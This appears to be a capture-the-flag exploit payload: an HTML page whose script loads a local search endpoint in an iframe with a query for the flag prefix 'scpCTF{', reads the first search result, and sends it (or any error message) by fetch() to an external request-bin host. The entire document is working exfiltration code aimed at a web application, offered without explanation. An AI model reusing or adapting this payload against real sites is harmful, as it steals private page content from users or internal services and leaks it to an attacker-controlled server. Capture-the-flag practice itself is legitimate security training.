<iframe src="" id="iframe" ></iframe>
<script>
const request_Bin = "https://tdsyvmk.request.dreamhack.games"

function search() {
    let iframe = document.querySelector("iframe");
    iframe.src = `http://127.0.0.1:5000/search?query=scpCTF{`;
    iframe.onload = function() {
        try {
            const iframeDoc = iframe.contentWindow.document;
            const flagElement = iframeDoc.querySelector('.results ul li');

            if (flagElement) {
                const flag = flagElement.textContent;
                fetch(`${request_Bin}?flag=${encodeURIComponent(flag)}`);
            }
        } catch (e) {
            fetch(`${request_Bin}?error=${e.message}`);
        }
    };
}

search()
</script>
